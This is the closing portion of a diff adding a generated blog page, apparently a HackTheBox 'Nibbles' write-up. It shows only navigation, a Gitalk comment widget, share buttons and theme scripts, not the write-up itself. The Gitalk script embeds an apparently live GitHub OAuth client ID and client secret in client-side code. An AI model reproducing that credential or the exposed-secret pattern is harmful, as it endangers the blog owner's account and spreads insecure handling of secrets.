+        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
+        <h4 class="title">Valentine - Hackthebox</h4>
+      </a>
+    </div>
+  
+
+  
+    <div class="waves-block waves-effect next">
+      <a href="/2022/04/08/Hackthebox/Hackthebox-Bashed/" id="post-next" class="post-nav-link">
+        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
+        <h4 class="title">Bashed - Hackthebox</h4>
+      </a>
+    </div>
+  
+</nav>
+
+
+
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<section class="comments" id="comments">
+    <div id="gitalk-container"></div>
+    <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+    <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+    <script>
+        var id = location.pathname
+        if (location.pathname.length > 50) {
+          id = location.pathname.replace(/\/\d+\/\d+\/\d+\//, '').replace('/', '').substring(0, 50)
+        }
+        const gitalk = new Gitalk({
+          clientID: 'cf0a9809323df14a9168',
+          clientSecret: 'a30d7a21bf6d88b7ad5c1f5d1bfc45881c49b2ed',
+          repo: 'LucifielHack.github.io',
+          owner: 'LucifielHack',
+          admin: ['LucifielHack'],
+          id: id,      // Ensure uniqueness and length less than 50
+          title: document.title.split('|')[0],
+          distractionFreeMode: false  // Facebook-like distraction free mode
+        })
+
+        gitalk.render('gitalk-container')
+    </script>
+</section>
+
+
+
+
+</article>
+
+
+
+</div>
+
+        <footer class="footer">
+    <div class="top">
+        
+<p>
+    <span id="busuanzi_container_site_uv" style='display:none'>
+        站点总访客数：<span id="busuanzi_value_site_uv"></span>
+    </span>
+    <span id="busuanzi_container_site_pv" style='display:none'>
+        站点总访问量：<span id="busuanzi_value_site_pv"></span>
+    </span>
+</p>
+
+
+        <p>
+            <!--- 
+                <span><a href="/atom.xml" target="_blank" class="rss" title="rss"><i class="icon icon-lg icon-rss"></i></a></span>
+            
+            <span>footer.license</span> --->
+        </p>
+    </div>
+    <div class="bottom">
+        <p><span>Lucifiel &copy; 2020 - 2023</span>
+            <span>
+                
+                Power by Lucifiel</a>
+            </span>
+        </p>
+    </div>
+</footer>
+
+    </main>
+    <div class="mask" id="mask"></div>
+<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>
+
+
+
+<div class="global-share" id="globalShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://www.lucifiel.com/2022/04/09/Hackthebox/Hackthebox-Nibbles/&title=《Nibbles - Hackthebox》 — Lucifiel's Blog&pic=http://www.lucifiel.com/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://www.lucifiel.com/2022/04/09/Hackthebox/Hackthebox-Nibbles/&title=《Nibbles - Hackthebox》 — Lucifiel's Blog&source=Lucifiel 技术博客" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://www.lucifiel.com/2022/04/09/Hackthebox/Hackthebox-Nibbles/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《Nibbles - Hackthebox》 — Lucifiel's Blog&url=http://www.lucifiel.com/2022/04/09/Hackthebox/Hackthebox-Nibbles/&via=http://www.lucifiel.com" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://www.lucifiel.com/2022/04/09/Hackthebox/Hackthebox-Nibbles/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+<div class="page-modal wx-share" id="wxShare">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAN4AAADeCAAAAAB3DOFrAAACwElEQVR42u3aQW7jMBAEwPz/08klh13Ekrs5pOPFlk6GLEssBSAnPfz4iI/PP46rb+8/X525+tXPJ179dsOBh4eHNxj6/a3vz9/frX3i/cst7oCHh4d3jJdP98kj20WlXRiSMePh4eG9My+Z3PNa9/4aPDw8vH+Xl9+hXSruFww8PDy89+ElYUQyobdRRbtIHMxa8PDw8KYVb93ieuXnI/09PDw8vHFXfW3qn995frfvO+Dh4eEd4OUT7jyiXZvc23IZDw8P7/W8NoZYi3TbjQLJ2C7HgIeHh3eYl4cR7StIwtld7bHofePh4eEt8ZIpfm1r1K6GWRsoP1gS8PDw8Lbykgk6P7MrtJ2EINHKhoeHhzfea7R30EmZnpPasf11DR4eHt5hXt6makvkdlvAWkjxJIzAw8PDO8BrS+21iLZ9ZW0IEq17eHh4eFt5yed2AcifMinBH5zBw8PDO8bLS941WDLQNv6IFiQ8PDy8l/DazlHbb2oBo1AYDw8P71S/adT0mgSvk9eatMHw8PDwTvMmrf1JM2yyjWDtSjw8PLz5lfnP8hB2Unzn0UP0yvDw8PC28vJmfI7JNxm0EXBdJ+Ph4eEd4LXbAvLYIt8aNYoV1kpqPDw8vAFvbTNTu2BMpvs8/H1wfzw8PLwDvHYDwaTgzttmydOLPwAeHh7eMV7bZGo3H7QbFNrQ4UkYgYeHh3eA15Ly85OtWu1WMDw8PLxX8iaDyAvuyfWjLh8eHh7eJt5nebTLxiSEXWuPPWiA4eHh4W3lrTXm2/bYWqFcN7rm/TQ8PDy8mLdWUrfTej5x5y9iMaXGw8PD28RbG/quGHexFF6MX/Dw8PB+h9fGB0lZvHblkyUHDw8P7w1456KNBLxtZwQeHh7emNcWvpPtU/kY8j/Dk4UBDw8PbyvvxH/0+bdt2+wtAgs8PLz/l/cFdp/kKQ38gs8AAAAASUVORK5CYII=" alt="微信分享二维码">
+</div>
+
+
+
+
+    <script src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
+<script>
+var BLOG = { ROOT: '/', SHARE: true, REWARD: false };
+
+
+</script>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/main.min.js"></script>
+
+
+<div class="search-panel" id="search-panel">
+    <ul class="search-result" id="search-result"></ul>
+</div>
+<template id="search-tpl">
+<li class="item">
+    <a href="{path}" class="waves-block waves-effect">
+        <div class="title ellipsis" title="{title}">{title}</div>
+        <div class="flex-row flex-middle">
+            <div class="tags ellipsis">
+                {tags}
+            </div>
+            <time class="flex-col time">{date}</time>
+        </div>
+    </a>
+</li>
+</template>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/search.min.js" async></script>
+
+
+
+
+
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+
+
+
+
+
+</body>
+</html>
